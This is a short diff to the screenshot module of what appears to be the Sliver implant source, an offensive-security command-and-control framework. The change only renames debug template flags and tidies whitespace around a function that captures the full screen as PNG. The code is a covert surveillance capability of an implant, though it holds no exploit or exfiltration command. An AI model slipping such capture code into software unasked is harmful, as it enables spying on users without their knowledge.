@@ -1,4 +1,3 @@
-
 package screenshot
 
 /*
@@ -22,7 +21,8 @@ package screenshot
 import (
 	"bytes"
 	"image/png"
-	//{{if .Debug}}
+
+	//{{if .Config.Debug}}
 	"log"
 	//{{end}}
 	screen "github.com/bishopfox/sliver/sliver/3rdparty/kbinani/screenshot"
@@ -45,18 +45,18 @@ func Capture() []byte {
 	}
 
 	img, err := screen.Capture(0, 0, width, height)
-	//{{if .Debug}}
-		log.Printf("Error Capture: %s", err)
+	//{{if .Config.Debug}}
+	log.Printf("Error Capture: %s", err)
 	//{{end}}
 
 	var buf bytes.Buffer
 	if err != nil {
-		//{{if .Debug}}
+		//{{if .Config.Debug}}
 		log.Println("Capture Error")
 		//{{end}}
 		return buf.Bytes()
-		
-	} 
+
+	}
 
 	png.Encode(&buf, img)
 	return buf.Bytes()
